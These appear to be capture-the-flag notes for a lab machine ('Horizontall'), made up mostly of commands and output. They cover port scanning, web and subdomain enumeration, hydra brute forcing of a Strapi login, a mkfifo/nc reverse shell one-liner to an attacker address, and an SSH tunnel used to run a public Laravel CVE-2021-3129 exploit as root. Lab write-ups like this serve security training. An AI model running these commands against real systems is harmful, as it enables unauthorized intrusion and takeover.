# scan
TARGET=10.10.11.105 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

for p in {1..65535}; do nc -vn 10.10.11.105 $p -w 1 -z & done 2> output.txt

PORT      STATE  SERVICE REASON         VERSION
22/tcp    open   ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
13308/tcp closed unknown reset ttl 63
18503/tcp closed unknown reset ttl 63
19365/tcp closed unknown reset ttl 63
22921/tcp closed unknown reset ttl 63
23994/tcp closed unknown reset ttl 63
28400/tcp closed unknown reset ttl 63
29442/tcp closed unknown reset ttl 63
36352/tcp closed unknown reset ttl 63
37463/tcp closed unknown reset ttl 63
41565/tcp closed unknown reset ttl 63
50109/tcp closed unknown reset ttl 63
53286/tcp closed unknown reset ttl 63
55112/tcp closed unknown reset ttl 63
55141/tcp closed unknown reset ttl 63
57180/tcp closed unknown reset ttl 63
62727/tcp closed unknown reset ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


# web enum
> dirsearch -u http://horizontall.htb -f -w /usr/share/wordlists/dirb/common.txt
```
[11:26:59] 403 -  580B  - /css/
[11:26:59] 301 -  194B  - /css  ->  http://horizontall.htb/css/
[11:27:11] 200 -    4KB - /favicon.ico
[11:27:22] 301 -  194B  - /img  ->  http://horizontall.htb/img/
[11:27:22] 403 -  580B  - /img/
[11:27:22] 200 -  901B  - /index.html
[11:27:26] 301 -  194B  - /js  ->  http://horizontall.htb/js/
[11:27:26] 403 -  580B  - /js/
```

> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://horizontall.htb/" -H "Host: FUZZ.horizontall.htb" --hl 7
```
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1 L      43 W       901 Ch      "www"
000001176:   200        1 L      43 W       901 Ch      "WWW"
```

`api-prod`

dirsearch -u  http://api-prod.horizontall.htb/ -f -w /usr/share/wordlists/dirb/common.txt

http://api-prod.horizontall.htb/admin/auth/login
[11:58:45] 200 -  854B  - /admin
[11:58:45] 200 -  854B  - /Admin
[11:58:45] 200 -  854B  - /admin/
[11:58:45] 200 -  854B  - /Admin/
[11:58:45] 200 -  854B  - /ADMIN
[11:58:45] 200 -  854B  - /ADMIN/
[11:59:06] 403 -   60B  - /connect/
[11:59:22] 200 -    1KB - /favicon.ico
[11:59:35] 200 -  413B  - /index.html
[11:59:35] 200 -  413B  - /index.html/
[12:00:15] 200 -  507B  - /reviews
[12:00:15] 200 -  507B  - /reviews/
[12:00:15] 200 -  121B  - /robots.txt/
[12:00:15] 200 -  121B  - /robots.txt
[12:00:38] 403 -   60B  - /users
[12:00:38] 403 -   60B  - /users/

http://api-prod.horizontall.htb/reviews/
wail
doe
john

http://api-prod.horizontall.htb/admin/auth/local

{"identifier":"wail","password":"wail"}


> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt api-prod.horizontall.htb http-post-form "/admin/auth/local:identifier=^USER^&password=^PASS^:F=invalid"

https://www.exploit-db.com/exploits/50239

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.x.x 4444 >/tmp/f

# user
strapi@horizontall:/home/developer$ cat user.txt
cat user.txt

# pe
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/opt/strapi/myapi/node_modules/.bin:/opt/strapi/myapi/node_modules/.bin:/opt/strapi/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /usr/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/opt/strapi/myapi/node_modules/.bin:/opt/strapi/myapi/node_modules/.bin:/opt/strapi/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1608/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -      

* check on port 8000

https://github.com/nth347/CVE-2021-3129_exploit

* exploit cannot run on target, needs to forward the target's local 8000 to attacker's 8000

# setup tunnel
> ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 -i /root/.ssh/id_rsa

python3 exploit.py http://localhost:8000 Monolog/RCE1 'cat /root/root.txt'
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

## root

[i] Trying to clear logs
[+] Logs cleared


